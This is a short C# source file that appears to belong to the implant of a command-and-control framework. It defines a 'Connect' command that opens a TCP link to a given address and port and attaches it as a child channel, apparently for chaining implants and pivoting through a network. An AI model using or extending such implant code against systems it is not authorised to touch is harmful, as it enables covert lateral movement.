using System.Threading;
using System.Threading.Tasks;

using Drone.CommModules;

namespace Drone.Commands;

public sealed class Connect : DroneCommand
{
    public override byte Command => 90;
    public override bool Threaded => false;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var address = task.Arguments[0];
        var port = int.Parse(task.Arguments[1]);

        var commModule = new TcpCommModule(address, port);
        
        await Drone.AddChildCommModule(task.Id, commModule);
        await Drone.SendTaskComplete(task.Id);
    }
}